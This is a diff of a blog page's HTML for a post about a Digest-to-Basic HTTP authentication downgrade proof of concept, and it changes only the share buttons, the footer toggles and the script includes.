 
     <span style="color:#f00">return</span> res
@@ -548,57 +540,47 @@ A sample command to get this running would be: <code>python proxpy.py -p 8090 -x
   
   
   <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f">
+    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f" aria-label="Facebook">
       <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&text=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack">
+    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&text=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack" aria-label="Twitter">
       <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&title=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack">
+    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&title=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack" aria-label="Linkedin">
       <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&is_video=false&description=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack">
+    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&is_video=false&description=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack" aria-label="Pinterest">
       <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="mailto:?subject=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f">
+    <a class="icon" href="mailto:?subject=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack&body=Check out this article: https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f" aria-label="Email">
       <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&title=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack">
+    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&title=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack" aria-label="Pocket">
       <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&title=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack">
+    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&title=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack" aria-label="reddit">
       <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&title=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack">
-      <i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://digg.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&title=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack">
-      <i class="fab fa-digg fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&name=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack&description=%3ch3%20id%3d%22introduction%22%3eIntroduction%3c%2fh3%3e%0a%3cp%3eLets%20start%20by%20saying%20that%20I%20am%20by%20%3cem%3eno%3c%2fem%3e%20means%20an%20expert%20at%20any%20of%20what%20I%20am%20about%20to%20write.%20Primarily%20this%20post%20is%20purely%20for%20research%20purposes.%20Think%20of%20it%20as%20one%20of%20those%20%3cem%3esomething%20to%20do%3c%2fem%3e%20scenarios.%20I%26rsquo%3bd%20like%20to%20cover%20some%20basics%20around%20HTTP%20Authentication%2c%20and%20then%20show%20a%20PoC%20of%20how%20this%20can%20be%20abused%20in%20a%20real%20world%20scenario.%20Hopefully%20this%20will%20help%20educate%20people%20to%20use%20more%20secure%20authentication%20mechanisms%21%20%3a%29%3c%2fp%3e">
+    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&name=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack&description=%3ch3%20id%3d%22introduction%22%3eIntroduction%3c%2fh3%3e%0a%3cp%3eLets%20start%20by%20saying%20that%20I%20am%20by%20%3cem%3eno%3c%2fem%3e%20means%20an%20expert%20at%20any%20of%20what%20I%20am%20about%20to%20write.%20Primarily%20this%20post%20is%20purely%20for%20research%20purposes.%20Think%20of%20it%20as%20one%20of%20those%20%3cem%3esomething%20to%20do%3c%2fem%3e%20scenarios.%20I%26rsquo%3bd%20like%20to%20cover%20some%20basics%20around%20HTTP%20Authentication%2c%20and%20then%20show%20a%20PoC%20of%20how%20this%20can%20be%20abused%20in%20a%20real%20world%20scenario.%20Hopefully%20this%20will%20help%20educate%20people%20to%20use%20more%20secure%20authentication%20mechanisms%21%20%3a%29%3c%2fp%3e" aria-label="Tumblr">
       <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
     </a>
   </li>
   <li>
-    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&t=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack">
+    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2013%2f06%2f25%2fdtob.py-digest-to-basic-authentication-a-simple-example-of-a-authentication-downgrade-attack%2f&t=dtob.py%3a%20Digest%20to%20Basic%20authentication%3b%20A%20simple%20example%20of%20a%20authentication%20%27downgrade%27%20attack" aria-label="Hacker News">
       <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
     </a>
   </li>
@@ -608,13 +590,13 @@ A sample command to get this running would be: <code>python proxpy.py -p 8090 -x
 
     <div id="actions-footer">
       
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;">
+        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
           <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;">
+        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
           <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;">
+        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
           <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');">
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
           <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
     </div>
 
@@ -650,6 +632,7 @@ A sample command to get this running would be: <code>python proxpy.py -p 8090 -x
 <link rel="stylesheet" href=https://leonjza.github.io/lib/font-awesome/css/all.min.css>
 <script src=https://leonjza.github.io/lib/jquery/jquery.min.js></script>
 <script src=https://leonjza.github.io/js/main.js></script>
+<script src=https://leonjza.github.io/js/code-copy.js></script>
 
 
 
